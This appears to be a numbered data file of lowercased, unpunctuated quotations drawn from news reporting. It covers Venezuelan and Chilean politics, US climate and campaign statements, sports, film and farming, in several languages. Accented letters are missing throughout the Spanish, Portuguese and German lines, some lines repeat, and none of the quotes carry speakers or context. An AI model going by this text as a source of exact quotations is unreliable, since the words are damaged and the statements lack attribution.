7547161 la misi n 13 de abril yo la concibo en tres direcciones fundamentales primero la infraestructura all donde llegue la misi n es donde tenemos que hacer una transformaci n habitacional del barrio o caser o segundo la s ntesis social las misiones barrio adentro mercal jos gregorio hern ndez deben converger y en tercer lugar el tema de la econom a comunal hay que traer fuerzas productivas al barrio
7547162 al mismo tiempo que aumenta el control de importantes bastiones en el sector privado aprueba leyes que promueven una mayor concentraci n del poder y dedica fuertes sumas para financiar compras militares el gobierno del presidente ch vez est incrementando las presiones en un campo especialmente sensible en este a o electoral los medios de comunicaci n y los periodistas dice el medio estadounidense
7547163 transmisi n emisi n o recepci n de signos se ales escritos im genes sonidos o informaciones de cualquier naturaleza mediante

7547168 este gobierno desprecia a los m dicos de tal manera que en lugar de colocar al frente del despacho de salud a alg n sanitarista a un galeno que comulgue con su planteamiento pol tico puso a un militar que no sabe nada de salud y que lo que ha hecho es truncar de manera inmisericorde la posibilidad de que la salud salga adelante
7547169 han transcurrido 10 a os del actual gobierno lo nico que est claro es que tenemos un sistema p blico desarticulado una red hospitalaria en p simas condiciones y un sistema paralelo misi n barrio adentro que apesar de los inmensos recursos que consume no resulta
7547170 la fuerza armada est evaluando eso pienso que no la retiraron porque nunca la tuvieron se han incrementado los asaltos a los cdi y nosotros hemos incrementado las medidas de inteligencia para evitar esas situaciones
7547171 la constituci n es infuncional para cambios que quiere ch vez
7547172 quieren hacer pasar leyes muy medulares para la transformaci n del pa s sin que el pa s participe

7547181 itll cost us about ten grand to get the arbitration process started six thousand for the fee and then we have to pay for the arbitrator too
7547182 thats for an expedited case and limited discovery six thousand allows you to ask for more than 500 000 in awards its considered a complex case then
7547183 youre learning and we dont have even two thousand let alone ten just to get the process started who knows how much more it will cost to get it concluded
7547184 im not done with the bad we also owe claudia rast 15 000 which she has been nice enough not to hound us for we have to pay her bill before we can ask any more help from her for the arbitration process
7547185 ill give dweeble a call im sure hell offer to help
7547186 twenty five grand huh wow well theres the disbursement money blairs got to hand it over some day
7547187 hes not italian though maybe we could break his kneecaps
7547188 that thirty one thousand disbursement money would get us in the arbitration door after paying claudia wed have six grand left to our name
7547189 well thirty one thousand aint good for much else is it
7547190 you have a point so we use it for arbitration that brings up the next problem
7547191 kami belum berhenti membeli pemain baru saya sadar kalu tim ini akan menghadapi kompetisi yang cukup panjang mendatangkan etoo adalah target selanjutnya
7547192 i am shocked that the right wing conservative crowd is not on here yet telling poor folks to just pull themselves up by their bootstraps ill bet its coming
7547193 funny how this god character is responsible for so much stuff and no one has yet to see him what a sorry cop out for all the losers of the world i would bring him up on charges of trespassing harboring illegals for all we know they could have been planning a terrorist attack i think put the ol reverend in a padded room and deport the rest do it fast so our tax dollars dont get milked out for 2 years funny how religion is an excuse to do wrong in some cultures
7547194 im optimistic but one never knows in politics until the votes are counted
7547195 bill ayers ive said this his father was a great friend of my father
7547196 people keep trying to align himself with barack obama its really unfortunate theyre friends so what people do make mistakes in the past you move on this is a new century a new time he reflects back and hes been making a strong contribution to our community
7547197 our father always told us when a group was big enough to control a ward we should pay attention to them
7547198 she knew that sometimes only the simplest actions are feasible and those are the ones that lead us out of illness and back into the world recovery it turned out was inevitable
7547199 foi para lavar a alma a raiva era v lida naquele momento estava de cabe a quente pela derrota felizmente depois do bate rebate a bola sobrou pra mim fiquei muito contente
7547200 todo mundo respeita e quer tirar ponto da gente ainda mais quem tenta sair do rebaixamento o clube pernambucano 17 tem jogo que o campo n o ajuda e temos que colocar o cora o na ponta da chuteira mas suportamos bem
7547201 acho que devemos manter ambos os p s no ch o qualquer coisa perto do top 10 j fant stico para n s

7547205 we had chatted about it but when i found out bon jovi was hosting the fund raiser we dropped it
7547206 many african negotiators have expressed concern that the current regime delivers few real benefits to the continent
7547207 the total value of projects in africa financed by the global environment facility in the last 17 years stands at 378 million dollars while the total value of projects worldwide is more than 2 4 billion dollars which reflects lack of benefits for the continent
7547208 the way african countries feel is that we need a fairer more equitable deal that is sensitive to the looming consequences of climate change on africa
7547209 only about two percent of the entire cdm projects worldwide are in africa which is unacceptably low in contrast to 45 percent located in china 16 percent in india and 13 percent in chile
7547210 it is true the cdm benefits the great emerging economies of china and india among others more than africa because of their fast rate of development and stable conditions for investment
7547211 a substantial national commitment by dramatically increasing investment in energy and climate change research and technology so that the united states becomes the world leader in developing and exporting alternative energy
7547212 most capable of getting this country back into an international climate regime getting us back to the table the fastest and with the most prospect for success because of my extensive engagement in foreign policy
7547213 im also in the best position to make it clear to the united states congress that this is not merely an environmental issue it is a security issue i held hearings this year pointing out that if we do not do something of consequence about global warming drastically and soon we literally are going to find ourselves reconfiguring our entire military to deal with occasions for new wars which are going to be about territory and arable land you see whats happening in darfur sudan now thats part of the problem
7547214 you have to begin here in the united states by capping emissions increasing renewable fuels establishing a national renewable portfolio standard rps requiring better fuel economy for automobiles
7547215 opposed a 40 mpg standard in 2005 and 2003 in 2002 supported a 35 mpg standard
7547216 would announce an executive order that the federal government would not purchase one single automobile for its fleet that gets less than 40 miles to the gallon
7547217 would cap emissions at 80 percent below 1990 levels by 2050 and set a national rps of 20 percent
7547218 would not build a single solitary federal project without it being a green project
7547219 by engaging in significant joint ventures with them both on new technologies
7547220 oppose subsidizing technologies that would worsen global warming even if they would reduce our reliance on foreign oil
7547221 ethanol is a good start because of the amount of resources that go into producing corn based ethanol it has only marginally less impact on the consumption of fossil fuels but it has two real advantages it begins to give us the margin of flexibility we need to deal with being held hostage to any one of the seven unstable countries that supply 35 percent of our oil nigeria venezuela iraq iran etc no 2 its a transitional means by which youre going to be pouring billions of dollars into the fields of the midwest rather than the sands of saudi arabia or the pockets of chavez
7547222 biofuels security act to increase the use of corn based ethanol production in the u s
7547223 i dont think theres much of a role for clean coal in energy independence but i do think theres a significant role for clean coal in the bigger picture of climate change clean coal technology is not the route to go in the united states because we have other cleaner alternatives but i would invest a considerable amount of money in research and development of clean coal and carbon sequestration technologies for export china is building one new coal fired plant per week thats not going to change unless theres a fundamental change in technology because they have about 300 years of dirty coal and theyre going to use it
7547224 i believe that all new coal fired power plants should be built with carbon capture and sequestration capacity
7547225 supports a cap and trade approach to regulating emissions and investment in technologies that can significantly reduce greenhouse gas emissions
7547226 sent a letter to president bush urging him to support mandatory national caps on greenhouse gases and a post 2012 framework for binding commitments for all major emitting countries
7547227 in 2007 alone biden voted to strengthen caf standards and to repeal unjust subsidies to oil companies in 1986 he introduced the first bill designed to limit global warming pollution biden has been a leader on global warming issues chairing senate foreign relations committee hearings on the national security implications of unchecked global warming he teamed with republican senator dick lugar to co author and pass a resolution calling on the bush administration to return to international negotiations to address climate change he has sponsored and supported numerous bills throughout his career that would decrease americas dependence on foreign oil and increase investment in new technologies and renewable fuels biden has sponsored a bill to increase fuel economy standards for all automobiles voted yes on reducing oil usage by 40 by 2025 and rejected drilling in anwr measures that have strong environmental and economic benefits for america

7547253 i am a 24 year old i live in a small town in ohio i have been married to my wonderful husband for three years we have three beautiful children who are 7 5 2
7547254 im 47 year old who enjoys living everyday of my life to the fullest my family is the most important part of my life i love playing softball watching college and pro football and basketball
7547255 im a mural artist who has discovered the challenge of painting on canvas rather than walls its limited space but i love it what better place to crawl into your thoughts when you can create them in front of your own eyes
7547256 i am a stay at home mom who needs a break from the 17 month old that i call my son he is very active and keeps me very busy my husband and i recently relocated with his job
7547257 i am single and looking and am told by pogo chatters that i am funny i have a serious side and am very opinionated about things in our world and life in general i dont smoke and drink socially and i am a great cook
7547258 i am the last born of a big family and also a twin my parents were in the navy so we traveled around a bit and then decided to settle in georgia no i am not a peach per se but
7547259 i was born and raised a redneck from the south in my home town of wichita kansas but i now live in michigan i enjoy football camping occasionally visiting the casino and playing pogo games
7547260 i am 20 years old i am self revealing neat unpredictable silly charming aggressive assertive organized and far from ordinary i happen to be a social chameleon
7547261 this is my art and it is dangerous do you think i want to die like this
7547262 i dont know about you miss kitty but i feel so much yummier
7547263 were cautiously confident about the fact that we have been able to make a step that is lifting the bans and thats not an easy thing for us to do
7547264 getting that number of bans in place was a huge logistical exercise and therefore it means a lot to actually lift them however weve had enough of an indication that government is serious about negotiating with us
7547265 it really depends on what the total package is at the end of the day before we take anything back to our members
7547266 if the negotiations break down i dont think wed have any choice but to return to industrial action and i dont think were talking about work bans
7547267 i think wed look at something more serious but i hasten to add im reasonably confident that we wont get to that point and we will get an outcome that is satisfactory to members
7547268 it is beyond doubt in my submission that mr white is guilty he said so he pleaded so
7547269 its quite conceivable that if there were to be some lack of good behaviour on the part of mr white it could be brought back to the court
7547270 this is a very positive move and i agree with the stakeholders that this is the next move
7547271 if such an authority is set up it would decide what inquiries and studies are necessary
7547272 there is a limited stock of people with the knowledge and expertise
7547273 you also have to factor in that people do take leave from time to time and the nature of our work is that you dont know when you will be getting work in
7547274 we had two to three planing schemes to deal with the past year and the hearings for those can be quite complicated and decisions can take a long time
7547275 sometimes they take longer than we like and we seek extensions from time to time we also try to accommodate lawyers and planners for the councils with our hearing dates
7547276 the decision by mr knowles a well known greens activist to appeal the meander valley councils approval of the pipeline would seem to be based on ideology rather than science and the facts
7547277 the greens and their allies need to accept that they were wrong in their campaign to oppose the meander dam and they are wrong to support an attempt to delay pipelines from the meander dam that could significantly benefit the agricultural production in the area
7547278 there has been a significant delay to the project it was originally hoped tenders would be lodged by september 1
7547279 ich glaube nicht dass wir hier schon einmal gespielt haben jedenfalls kommt mir der ort berhaupt nicht bekannt vor
7547280 als ich heute mittag zur klippe ging dachte ich dass das einer der sch nsten orte ist den ich jemals gesehen habe
7547281 the global entertainment and media industry will be worth 1 8 trillion 977bn by 2010 says a report
7547282 if a company is doing badly then you blame the managing director so it is right and fair that the coach be held responsible i know people are angry and rightfully so
7547283 i am prepared to take all that responsibility for the good of the team i still back the players do they suddenly become bad players or is there something else wrong
7547284 we should have won the opportunities were there but we just let them slip
7547285 im not going to panic because having watched the video again i saw how great we played
7547286 im looking forward to keeping moving in the right direction to keep giving myself chances in the next two weeks and then to get ready for the ryder cup and see if we can have a good tour championship and at least have a chance at winning the fedexcup
7547287 i felt like i played solid all week i got a couple of bad breaks here and there that maybe would have made the difference and a couple of good ones here and there too
7547288 i wouldnt be out here if i wasnt 100 but like anything you cant have the illness that ive had and then just go and train and then after two minutes go and play straight away
7547289 you need to almost harden your body like last season when the manager took over i played almost 20 games under his reign and there wasnt even an ounce of a problem because your body gets hardened to playing
7547290 i want to do my best and try to make it permanent
7547291 i had a few options but i chose sunderland because of the manager the club has big ambitions and really good players
7547292 i feel like i have a point to prove because i think i can do really well in the premier league and show people i can score goals in this division
7547293 the way i play my game i think i am made for england
7547294 el hadji called me he had a few words with me and said the ambition at the club is good so i said good
7547295 its a good lively forward line with me and el hadji and dont forget about kenwyne jones as well and plenty of other players who are quality
7547296 nobody expects sunderland to be a good team but i know the boys now and we want to show people that we are a good club and that we can go and do well
7547297 we can surprise a lot of teams like we did against tottenham
7547298 it was a surprise for me to score on my debut and i was very happy for the guys for the manager and for the people who support me
7547299 this is obviously a very unusual case where the suspect has entered the property naked and has fled from the scene
7547300 i want some introspection but lets be realistic im never going to be able to completely create that scenario
7547301 you break down the walls as much as you possibly can
7547302 whether or not thats the real reason im not sure but thats what hes told us
7547303 he was a bit of a recluse he looked after goats then the fame that he got from being a guinness world record holder meant that he found himself a wife his life improved
7547304 this is dawn and she might have a crush on you
7547305 its been a great 20 years in television god bless
7547306 ok lets go to stupid human tricks lets see you top this one
7547307 this is dawn and she might have a crush on you
7547308 its been a great 20 years in television god bless
7547309 ok lets go to stupid human tricks lets see you top this one
7547310 jennifer horn has decided that defending the second amendment just isnt that important this year
7547311 this is despite the supreme courts narrow defense of second amendment rights and nancy pelosis commitment to restoring the dc gun ban
7547312 every time jennifer horn is caught taking positions on both sides of an issue she lashes out but refuses to explain herself
7547313 instead of picking a position and sticking to it jennifer horn now believes these issues just arent important
7547314 jeanne shaheen always took the tax pledge until she didnt then she proposed a sales tax for new hampshire
7547315 now bob clegg has abandoned his commitment to oppose tax increases and continues to push a national sales tax
7547316 i dont need to sign every time its a good publicity stunt
7547317 bob clegg should know that the tax pledge isnt a publicity stunt its a firm commitment to the voters of new hampshire to oppose new taxes
7547318 bob clegg had no problem taking this pledge in the past whats changed bob
7547319 wed always ask her mildred what are you doing today
7547320 what things mean the most to us how do otherwise ordinary items come to symbolize experiences aspirations and identity
7547321 sir sean is scotlands most famous former milkman and a true british cinema legend
7547322 his achievements are an inspiration to us all and i salute him as both the best ever james bond and a great scot who helped campaign for devolution
7547323 now is a time to put aside our differences such as his support for the old firm and celebrate his contribution to our cultural life
7547324 but any time sir sean visits from the bahamas there is a seat waiting for him at tynecastle alongside his fellow jambo alex salmond
7547325 i am sure the snp leader will want to join us in wishing sir sean a happy birthday
7547326 we welcome the role he played in supporting devolution although the james bond star does not make a home here in scotland anymore im sure he will appreciate what this parliament has done for his fellow countrymen and women over the past decade
7547327 golf is not bad but as prices are unstable and the economic situation is not getting better president lee thinks they need to consider public sentiment

7547344 its a wildly innovative approach given the gravity of the announcement in contrast to the perceived casualness of text message conversations but from a communications standpoint it just might be his most brilliant move yet after all everyone knows that the most effective communications strategies are those that directly target and engage influential stakeholders in this case voters and make them feel empowered
7547345 it went really well we had a very big turn out of cars and we have been told we have broken a record for having the highest number of these cars on one site
7547346 the seafront was packed on saturday as it was a lovely day the public was not put off by the weather on sunday as they still came along to see the cars
7547347 it is quite unique to have so many different cars in the one area you see some of the same cars every year but there are always some new ones that people have built over the year and that is always good suffolk homes

7547366 la idea es generar un espacio de encuentro debate y dialogo entre distintos actores del mbito acad mico empresarial estado y sociedad civil relativo a diversos aspectos de la convivencia intercultural en el contexto local nacional y latinoamericano

7547370 se habla de interculturalidad pero no se garantiza el derecho al idioma y a la historia de los pueblos originarios

7547377 la direcci n regional de la comisi n nacional del medio ambiente conama ais n ha declarado admisible al sistema de evaluaci n de impacto ambiental seia el estudio de impacto ambiental del
7547378 este proceso tiene como objetivo central resguardar el derecho de las personas naturales y jur dicas que puedan sentirse afectadas a hacer las observaciones ambientales que estimen pertinentes enriqueciendo la evaluaci n y d ndole a la autoridad mayores herramientas para resolver al respecto
7547379 la situaci n que afecta a las familias de nuestras comunidades lafkenche y pescadores artesanales que no han negociado con celco es producto de una pol tica que ha desarrollado el estado chileno para salvaguardar los intereses de privados por sobre los derechos humanos consagrados en la carta de las naciones unidas y en todos los pactos firmados por chile como el convenio 169 de la o i t o la declaraci n de las naciones unidas para los derechos de los pueblos ind genas

7547383 manifestamos nuestro repudio contra el estado chileno y sus aparatos policiales quienes ingresan a nuestras comunidades para allanarlas con violencia desmedida golpeando y disparando a nuestros ni os mujeres y ancianos destruyendo nuestras casas con la nica justificaci n de encontrar armamento y culparnos de actos de terroristas
7547384 manifestamos nuestro repudio contra el estado chileno y sus aparatos policiales quienes ingresan a nuestras comunidades para allanarlas con violencia desmedida golpeando y disparando a nuestros ni os mujeres y ancianos destruyendo nuestras casas con la nica justificaci n de encontrar armamento y culparnos de actos de terroristas
7547385 esto es un hecho que calificamos como grave inaceptable y lo que corresponde en un estado de derecho es que el ministerio p blico siga adelante con la persecuci n tal como lo ha hecho hasta ahora cuando hay conversaciones destinadas a mejorar las condiciones de tranquilidad del sector que se ha aludido obviamente representa un retroceso no obstante que nosotros no podemos imputar responsabilidad a ning n grupo por el minuto m s all del comunicado que se adjudica este atentado
7547386 en este caso se hab an adoptado medidas que estaban dando muy buenos resultados dos fiscales con dedicaci n exclusiva coordinados por un fiscal regional eso se va a mantener e incrementar si bien ha habido algunos resultados esto es un retroceso estamos a la espera de los detalles del atentado pero la se al clara es que no se va a tolerar ninguna impunidad por el contrario se va a ser a n m s severo en la persecuci n de los il citos
7547387 bajo ese aspecto ya han sido condenados varios hermanos y el gobierno de michelle bachelet contin a con esta tendencia de estigmatizar el conflicto mapuche bajo supuestos delitos que nunca han sido ver dicamente determinados como realizados por mapuches s lo se testimonia la presencia de encapuchados que no se sabe cu l es su procedencia y de inmediato se incrimina a los hermanos de las comunidades como en este caso de la cam
7547388 me llama la atenci n la premura con que el gobierno declara ya qui nes son los culpables que la sociedad nacional de agricultura declare qui nes son los culpables es un sistema que viene aplic ndose desde hace tiempo en definitiva yo creo que es una estigmatizaci n de las organizaciones mapuches y con esto busca desestimar una leg tima demanda territorial cultural y pol tica
7547389 viven preocupados del transantiago y no hacen nada con el transmapuche
7547390 y d nde est el famoso estado de derecho sirve acaso para algo
7547391 estamos ante un hecho delictual o m s bien pol tico
7547392 claramente se trata de un simple hecho delictual lo peor ser a darle un cariz pol tico a estas acciones vand licas repudiadas por la ciudadania
7547393 extra o hecho delictual donde los malhechores no roban nada y lo que parecieran visibilizar m s bien son consignas
7547394 quien no entiende a la buena entender con toda la fuerza del derecho
7547395 estamos ante un hecho delictual y perseguiremos crimin lmente a los responsables
7547396 seremos m s severos en la represi n no se va a tolerar ning n tipo de impunidad
7547397 62 hect reas una yunta de bueyes una vaca parida semillas y madera
7547398 es por ello que el gobierno junto con hacerse parte en lo procesos judiciales para aclarar los hechos debe trabajar m s activamente en la soluci n de las hist ricas y presentes demandas sociales particularmente sobre las tierras mapuche
7547399 manifestamos nuestra condena categ rica a este hecho de violencia y esperamos que se realice una investigaci n acuciosa transparente y con pleno respeto a los derechos humanos para determinar qui nes fueron sus responsables
7547400 no obstante hacemos un llamado a no estigmatizar al pueblo mapuche a ra z de este hecho como lo han manifestado algunas autoridades y exigimos que estos lamentables sucesos no constituyan una nueva carta blanca para continuar con la pol tica gubernamental de criminalizar las protestas y reivindicaciones mapuches que ha terminado en violentos procedimientos policiales con saldos de personas heridas y muertas
7547401 viven preocupados del transantiago y no hacen nada con el transmapuche
7547402 de las actuaciones administrativas que aquel el stj de rn tom en cuenta para fundar esa decisi n de negar la instancia judicial entendiendo que no se hab a agotado la v a administrativa surge la conclusi n diametralmente opuesta

7547406 pedimos al ejecutivo que tenga mucho cuidado esta no es una movilizaci n normal y corriente el gobierno ha declarado una guerra abierta a los ind genas y ellos han dicho que continuar con su protesta hasta que no se solucionen sus problemas no tienen miedo prefieren morir all que perder sus tierras
7547407 hay un movimiento para liberar los territorios ancestrales ind genas y hasta ser independientes del estado peruano

7547411 secondo uninterpretazione possibile del principio di non contraddizione qualsiasi proposizione contraddittoria potrebbe essere sciolta mostrando che la contraddittoriet dipende dallassumere che sia detta nello stesso tempo e sotto il medesimo rispetto se si approfondisce la storia di vita si pu sempre trovare la differenza significativa per la quale affermazioni reciprocamente contraddittorie si possono comporre in una comprensione che ne sappia ascoltare i diversi tagli costruttivi in linea di principio sarebbe cos possibile dare ragione di tutte le affermazioni proprio perch se ne radicalizza la circostanzialit e se ne rispetta come realt propria e differenziante lindividualit al tempo stesso e proprio per questo solo la verit tutta intera pu mostrare la verit di ogni affermazione parziale in primo luogo perch circostanza di ogni affermazione quella di partecipare al discorso alla cultura alla storia infine alla totalit dellessere

7547937 we have recently commenced proceedings against parties involved in the production and distribution of a movie entitled hari puttar
7547938 warner bros values and protects intellectual property rights however it is our policy not to discuss publicly the details of any ongoing litigation
7547939 since the case is sub judice we cant comment as of now
7547940 however we registered the hari puttar title in 2005 and its unfortunate that warner has chosen to file a case so close to our films release in my opinion i dont think our title has any similarity or links with harry potter
7547941 he called me five days later and goes lisa im done with the album
7547942 the one thing that could re create the west is russia acting in opposition to the west nato had lost its way the russians have created a situation which gives nato a raison detre again to contain russia

7547947 i dont really know i hadnt really thought about it just being together with her was almost like a drug
7547948 was given to me by the one person ive always looked up to
7547949 i always left that ambiguous i never really knew if i was or wasnt
7547950 she usually did so in an understated way calling special attention to it by keeping it extra quiet
7547951 ive worked for persons who worked directly with all the other organizations we have just mentioned
7547952 clark liked to exaggerate he sometimes told stories people wanted to hear so that not everything you hear from some of these old friends is anything but a little puffing on his part

7547955 my dog yeats was always very much in love with amelia henry kissingers dog
7547956 he was very elusive and he had many different past lives
7547957 it was a like peering into the mind of somebody who had lived to be so many different people
7547958 i think he would love to have everybody believe he is all of these characters and identities and i think hes convinced himself so much so that its altered his reality to some extent
7547959 but i do think he is in a way putting on a little bit of a performance
7547960 perhaps at some point we can do a dna test to really find out
7547961 hes truly humbled by the outpouring of support and wouldnt miss it for anything in the world
7547962 it didnt fit me anymore so i figured id reuse it

7547967 we need water but we dont want to get 10 inches at a time
7547968 the worst part of this storm is that it is moving so slow and continues to put out that rain
7547969 this extremely slow rate of forward speed could support historic rainfall amounts across the northern reaches of the sunshine state over the next few days

7547975 what have been a number of questions and apparent discrepancies however all the information the chinese gymnastics federation presented supports its insistence that its athletes were old enough to compete we believe the matter will be put to rest and theres no question on the eligibility

7547977 barack has chosen joe biden to be his running mate

7547980 mike thought he could escape the pain by creating a diversion from his addiction to adult pornography so he created the cancer scenario
7547981 we fully understand the questions shock disbelief and even anger you may feel but michael is struggling with a different kind of illness and is receiving professional help
7547982 we will gladly pay it back if people want their money back absolutely we are glad to make restitution
7547983 as a result of this secret life of sin my body would often break down i would report the cause of my symptoms simply as illnesses but the truth is that although i was ill i did not have cancer but again used a mis diagnosis to hide the lie that i was living
7547984 michael was a man he sinned and he needs to be forgiven
7547985 everybody is a sinner and weve all been forgiven by god
7547986 the first two testing the candidates managerial and consensus building skills are undeniably useful but like most americans i find it is the third the gratuitous humiliation of our would be kings that makes it all worthwhile
7547987 still this mccains gain in the polls should be a huge wake up call to obama and the democrats from my perspective obama needs to introduce a game changer and fast before public opinion starts to gel around the notion that he is a phenom who deserves great respect but is not seasoned enough and would be too much of a risk in the oval office
7547988 it is never admitted than an election campaign or what poses as an ideological debate is in fact a contest between personalities but that is what it has become the issues merely provide the occasions for testing the personal appeal of the contenders everything hinges on the tremble of the hand or voice the glimmer of sweat on brown or upper lip ones general air of ease of unease under performance pressure

7547995 i dont want to talk to him i want him to cut my hair
7547996 one of the limiting factors we had in the past was the proper international business development and international marketing it is a capital intensive industry so it is expensive to develop new products and even more expensive to sell those to customers because your marketing and order cycle is typically between 12 and 36 months on our products so you must really have a lot of depth of resources human resources and financial resources
7547997 in terms of brand equity everybody knows bae systems they are the third biggest defence contractor in the world so it is easier to get new potential customers
7547998 we are a small outfit size wise it the merger is a mismatch but capability wise its a very good marriage and we hope to catch up size wise
7547999 we recently won a follow up contract for the next seven antennas for the meerkat programme and we have also teamed up with bae systems australia to try and get in on the australian programme
7548000 the total synergistic marriage between the two companies means that we can do the antennas and they can do the sensors
7548001 the university of florida the university of georgia and usda keep releasing new peanut varieties and we need to keep comparing them
7548002 this is the first year weve been able to look at twin and single rows of new cultivars such as georgia 7w georgia greener florida 07 mccloud ap 4 york and tifguard
7548003 many producers want to go back and plant these cultivars earlier maybe in mid to late april as opposed to mid to late may weve been going with the later planting dates due to the threat of tomato spotted wilt virus well see how these varieties respond to the earlier dates
7548004 weve gotten several questions about whether we might be able to back off the recommended seeding rate of six seed per foot of row or three seed for twin for some of these new varieties so were evaluating some of these new cultivars in twin and single rows to see if we can possibly drop back on those rates and maybe save you on some seed costs or potentially even bump them up for higher yields
7548005 were looking at how various cover crops break down and provide nutrients back to the soil which in turn provides nutrients to the subsequent crop weve worked on a sod based rotation for peanuts growing peanuts after bahiagrass were looking at various aspects of that rotation where were killing the bahiagrass in the fall or in the spring we want to see if that has an effect on how peanuts will germinate and grow in addition were looking at two years versus three years of bahiagrass versus standard rotations
7548006 weve also got studies this year where were comparing 30 inch row peanuts with 36 inch rows were looking at inoculants and starter fertilizer rates on peanuts and how they interact with one another or on their own with the various varieties
7548007 fertilizer prices are at an all time high so were looking at ways to still make a good crop things like soil testing and getting the proper ph
7548008 also there are several new fertilizer additives that are advertised to make your fertilizer more efficient and were looking at those
7548009 it might depend on where you are now if you were a little over to begin with you might have a little room but if youve already cut back to where you need to be and you cut back further youll probably cut your yields
7548010 in terms of aphid management we conduct standard efficacy trials each year looking at various insecticides and aphid control and we do have very good materials to control aphids also we can do it fairly economically maybe a more important question is whether or not there is a yield response to aphid control in general when we look at all our data conducted over the past several years we cannot see a consistent yield response to controlling aphids we may have a response every now and then but its not consistent
7548011 in doing that we can have different timings or thresholds for treating aphids based on the number of aphids per leaf
7548012 one of our objectives with these trials is to understand the critical window of when it is most important that we do a good job of checking cotton for stinkbugs
7548013 during the fourth or fifth week of bloom youve got a lot of bolls on the plant that are susceptible to stinkbugs were continuing to refine when is that critical window when we need to be doing a really good job of controlling stinkbugs its somewhere between that third to fifth or sixth week of bloom thats when we have the most to lose from stinkbugs
7548014 we will communicate to usda that congress did not include any requirement to change the criteria for meeting the definition of actively engaged in farming other than those necessary to implement the spouse eligibility provisions
7548015 we believe it is extremely important that usda be aware of this in spite of senators grassley and dorgans arguments to the contrary
7548016 usda will have to develop entirely new tests for adjusted gross farm income and adjusted gross non farm income
7548017 unlike the current adjusted gross income test which can be verified using a tax return if necessary the new tests will require usda to develop definitions and procedures to calculate farm and non farm income
7548018 the council has established a working group of top cpas to assist us in developing recommendations and were also working with some outstanding law firms with expertise in this area we have also included representatives from rice and peanut groups in the income testing working group
7548019 we will continue to be actively involved in the process of developing a reasonable and equitable procedure to apply the new income tests since the consequence of failing the tests are so severe
7548020 very few of us were satisfied with the farm payment reform that was finally agreed to in the farm bill so this is an opportunity for the bush administration that youd think theyd be crying for to leave its mark in this area
7548021 the farm bill left some big loopholes we can start to close with the right action by the administration
7548022 this funding will allow farmers and ranchers to repair the unusually harsh damage to conservation efforts caused by the disaster conditions notably flooding and drought
7548023 usda has worked shoulder to shoulder with producers when weather turns against them and we remain involved to help in the weeks and months of recovery afterward
7548024 aflatoxin can cause a lot of problems so its worth a farmers time and effort to submit corn samples to the north carolina department of agriculture and consumer services for testing

7548052 all this talk about creation of indian mujahideen images needs to be probed i would not be surprised if such an organization has been floated by fundamentalist bodies like the rashtriya swayamsevak sangh or vishwa hindu parishad with the sole intention of defaming muslims
7548053 i am not giving any clean chit to anyone but the manner adopted by the investigating agencies speaks of a blatant bias and a predetermined approach

7548354 the npp approached us and requested that they needed to use the song for their campaign this year and that was it
7548355 i am not worried at all that the npp is using my song it is a popular song and i hear it is even played in some clubs so i am not worried a political party is using it
7548356 look that song is very inspirational and encourages people to go higher in whatever field of endeavour they are and if the npp is using it to tell ghanaians to go higher with them i am cool with that
7548357 the npp did not buy it from me per se but we had a negotiation for them to pay a sum of money for the copyright and that is the norm
7548358 nana akufo addo on his own joined me on stage to do the kangaroo dance and i think it has to do with the favour of god when the favour of god is working it is not about you struggling
7548359 he was the general manager for otec fm in kumasi and i went there with my third album in 2003 and that was how we met and became friends
7548360 he is cool he is handsome and a christian and understands what i do i am proud of him we are now on a national music tour preaching peace tolerance and unity every where we visit i believe that is the message we need in this election period we have been to sunyani and kumasi and would be in berekum and techiman
7548361 well the truth is that i was told i would be given a brand new car but i have not received it i hear it is a tata indigo but i have not seen it
7548362 but how will they make a movie out of it if jordan died before the series was finished
7548363 shouldnt he have seriously cracked already how much more is she gonna put him through was this really necessary
7548364 because id never written songs before we didnt know what the rules were
7548365 we didnt know you shouldnt write about the tasteless things going around in your head
7548366 this musical is coming from the mind of dana marschz the teacher and he doesnt think its funny and hes not trying to be offensive
7548367 the joke of it is that hes so damaged and hes trying to be so honest with his feelings but hes so limited with his abilities that it ends up being completely inappropriate
7548368 hes the son of god and i think thats cool
7548369 so why do i feel like ive been raped in the face
7548370 it maybe came out of frustration because we had seen so many musicals and we were trying to do something that was really funny
7548371 im not pretending these songs are as good as any musical ever
7548372 i hope people will think theyre a breath of fresh air
7548373 it was eerie but on the other hand when looking at it from stauffenbergs viewpoint and what he did and what these men did it was powerful
7548374 as an actor i think i can say for all of us who were there that we felt fortunate to get those locations and shoot at those places it really changes the performances to do it there at that spot
7548375 these guys are true american patriots they were fighting two wars
7548376 they were fighting the nazis the fascists in europe and fighting the japanese in the pacific and they were fighting jim crow racism prejudice in the united states of america at the same time
7548377 i love the idea of it it applied to where bond was at the end of the last movie
7548378 the one thing he didnt have with the relationship was that quantum of solace
7548379 its rare where you get a piece of material thats politically pertinent like this but also sort of non preachy and engaging entertainment for an audience
7548380 he doesnt want to be a monster he doesnt want to kill people
7548381 he loves her but if he gets too passionate he will want her blood he will want to kill her
7548382 doing those type of scenes is always a bit strange never mind a husband but an entire crew watching you
7548383 this was two lone wolves its a duel two complicated fascinating really brilliant people
7548384 for men with their histories their intelligence their egos a contest like this really did become kind of life and death
7548385 they say it in the piece there can be only one winner
7548386 were telling it while hes still in office which has never been done
7548387 the bush family is a political dynasty in america its the closest thing we have to a political dynasty other than john adams and john quincy adams weve never had father and son presidents like this before
7548388 the set decoration is insane and beautiful to think in the first movie we only had a ladder
7548389 everythings bigger from details like the wardrobe because of how big the screen is and the musical numbers are so much bigger
7548390 he believes hes only got a short time to live and that hes come down with this disease so hes kind of convinced hes got to get up the nerve to tell her how he feels before he dies
7548391 well these people cant make a difference in the organizations bottom line
7548392 they cant individually really have much of an impact on overall company performance

7548399 es importante que la ciudadan a conozca el resultado de esta investigaci n donde se establece que nuestro colega fue detenido sin m ritos en circunstancias de que estaba realizando su labor profesional
7548400 el procedimiento policial fue adoptado conforme a la legislaci n vigente
7548401 entonces vemos ac una incongruencia entre las prerrogativas que carabineros cree tener para ejercer su labor y lo que el ministerio p blico se ala ya que en ltima instancia la fiscal a se desiste del procedimiento toda vez que no encuentra m ritos suficientes para seguir con la causa
7548402 como colegio creemos que es importante que la ciudadan a conozca el resultado de esta investigaci n donde se establece que nuestro colega fue detenido sin m ritos arbitraria e ilegalmente en circunstancias que estaba realizando su labor profesional ser a muy relevante que carabineros reconozca de una vez por todas el error en el procedimiento considerando que la ciudadan a cada d a est m s atenta al actuar de los organismos p blicos
